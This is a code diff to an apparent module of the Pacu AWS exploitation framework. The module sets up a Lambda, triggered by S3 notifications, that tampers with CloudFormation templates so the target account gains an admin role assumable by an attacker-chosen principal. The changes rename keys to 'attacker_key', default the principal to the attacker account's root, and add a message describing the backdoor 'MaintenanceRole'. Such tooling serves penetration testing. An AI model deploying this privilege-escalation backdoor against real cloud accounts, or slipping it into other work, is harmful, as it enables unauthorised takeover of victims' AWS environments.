@@ -12,12 +12,8 @@ import botocore.exceptions
 from botocore.exceptions import ClientError
 
 from pacu import Main
-from pacu.core.lib import module_data_dir
+from pacu.core.lib import module_data_dir, PacuException
 from pacu.core.models import AWSKey
-
-
-class PacuException(Exception):
-    pass
 
 
 if TYPE_CHECKING:
@@ -42,10 +38,11 @@ module_info = {
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
 parser.add_argument('--principal', help='''
-The principal to set in the injected roles trust policy. If the attack succeeds this user/role will be able to assume the
-newly created role which has admin privileges. Defaults to the current user used by Pacu.
+    The principal to set in the injected roles trust policy. If the attack succeeds this user/role will be able to
+    assume the newly created role which has admin privileges. Defaults to the root principal for the account used
+    for the --attacker-key.
 
-Example: arn:aws:iam::123456789012:role/example.
+    Example: arn:aws:iam::123456789012:role/example.
 '''.strip())
 
 parser.add_argument('--delete', action='store_true', help='Delete an existing deployment.')
@@ -122,12 +119,8 @@ def get_account_id(sess: 'boto3.Session'):
 
 # Main is the first function that is called when this module is executed.
 def main(args, pacu_main: 'Main'):
-    session = pacu_main.get_active_session()
-
-    ###### These can be removed if you are not using the function.
     args = parser.parse_args(args)
     print = pacu_main.print
-    ######
 
     # Default to using the s3_access_key if s3_notifications_setup_key is not provided.
     if args.s3_notifications_setup_key:
@@ -135,8 +128,9 @@ def main(args, pacu_main: 'Main'):
     else:
         s3_notifications_setup_key = args.s3_access_key
 
-    user = pacu_main.key_info()
-    principal = args.principal or user['Arn']
+    attacker_sess = get_session_from_key_name(pacu_main, args.attacker_key)
+    account_id = get_account_id(attacker_sess)
+    principal = args.principal or f"arn:aws:iam::{account_id}:root"
     if not principal:
         print("Must use the --principal argument to specify which user we want to be able to elevate permissions.")
 
@@ -148,9 +142,9 @@ def main(args, pacu_main: 'Main'):
         sess = get_session_from_key_name(pacu_main, args.s3_access_key, 'us-east-1')
         bucket = get_bucket_name(sess.resource('s3'), lambda_dir)
 
-    deploy_key: 'AWSKey' = pacu_main.get_aws_key_by_alias(args.lambda_deploy_key)
+    deploy_key: 'AWSKey' = pacu_main.get_aws_key_by_alias(args.attacker_key)
     if not deploy_key:
-        print(f"Did not find the key {args.lambda_deploy_key} in pacu, make sure to set this with `set_keys` first.")
+        print(f"Did not find the key {args.attacker_key} in pacu, make sure to set this with `set_keys` first.")
 
     env = lambda_env(pacu_main, bucket, deploy_key)
 
@@ -158,28 +152,39 @@ def main(args, pacu_main: 'Main'):
     if args.delete:
         delete_lambda(deploy_dir, env)
     else:
-        principal = args.principal or user['Arn']
+        principal = principal
         s3_access_key: 'AWSKey' = pacu_main.get_aws_key_by_alias(args.s3_access_key)
         deploy_lambda(pacu_main, env, deploy_dir, bucket, principal, s3_access_key)
 
     region = get_region(bucket, pacu_main.get_regions('lambda'))
-    sess_lambda_deploy = get_session_from_key_name(pacu_main, args.lambda_deploy_key, region)
-    sess_s3_notifications = get_session_from_key_name(pacu_main, s3_notifications_setup_key, region)
+    s3_notifications_sess = get_session_from_key_name(pacu_main, s3_notifications_setup_key, region)
 
     # No need to remove this on args.delete since we are deleting the lambda either way.
     if not args.delete:
-        bucket_account = get_account_id(sess_s3_notifications)
-        add_lambda_permission(sess_lambda_deploy, bucket_account, bucket, LAMBDA_NAME)
+        bucket_account = get_account_id(s3_notifications_sess)
+        add_lambda_permission(attacker_sess, bucket_account, bucket, LAMBDA_NAME)
 
     if args.delete:
-        remove_bucket_notification(sess_s3_notifications, bucket)
+        remove_bucket_notification(s3_notifications_sess, bucket)
     else:
-        deploy_sess = get_session_from_key_name(pacu_main, args.lambda_deploy_key, region)
-        lambda_account = get_account_id(deploy_sess)
-        lambda_arn = f"arn:aws:lambda:{deploy_sess.region_name}:{lambda_account}:function:{LAMBDA_NAME}"
-        put_bucket_notification(sess_s3_notifications, bucket, lambda_arn)
+        lambda_account = get_account_id(attacker_sess)
+        lambda_arn = f"arn:aws:lambda:{attacker_sess.region_name}:{lambda_account}:function:{LAMBDA_NAME}"
+        put_bucket_notification(s3_notifications_sess, bucket, lambda_arn)
 
-    return 'Lambda creation succeeded'
+    if args.delete:
+        msg = "Successfully deleted deployment."
+    else:
+        msg = f"""
+Deployment successful.
+
+After a modified CloudFormation template is successfully deployed in the target account there will be a new role
+created with admin privileges that can be assumed from the '{principal}' principal.
+
+This role name is randomly chosen by CloudFormation but will have 'MaintenanceRole' in the name. It is possible to
+to explicitly set this name if needed however this is not supported at the moment.
+
+"""
+    return msg
 
 
 def lambda_env(pacu: 'Main', bucket: str, key: 'AWSKey'):
@@ -234,10 +239,11 @@ def delete_lambda(bucket_lambda_dir, env):
     shutil.rmtree(bucket_lambda_dir)
 
 
-def get_session_from_key_name(pacu_main: 'Main', key_name: str, region: str):
+def get_session_from_key_name(pacu_main: 'Main', key_name: str, region: str = 'us-east-1'):
     key: 'AWSKey' = pacu_main.get_aws_key_by_alias(key_name)
     if not key:
-        print(f"Did not find the key {key_name} in pacu, make sure to set this with `set_keys` first.")
+        raise PacuException(f"Did not find the key {key_name} in pacu, make sure to set this with `set_keys` first.")
+
     return boto3.Session(
         region_name=region,
         aws_access_key_id=key.access_key_id,
@@ -250,7 +256,6 @@ def put_bucket_notification(sess: 'boto3.Session', bucket: str, lambda_arn: str)
     s3 = sess.client('s3')
     resp = s3.get_bucket_notification_configuration(Bucket=bucket)
     conf = remove_our_notification(resp)
-    print(conf)
     conf.setdefault('LambdaFunctionConfigurations', []).append({
         'Id': 'cfn_notifications',
         'LambdaFunctionArn': lambda_arn,
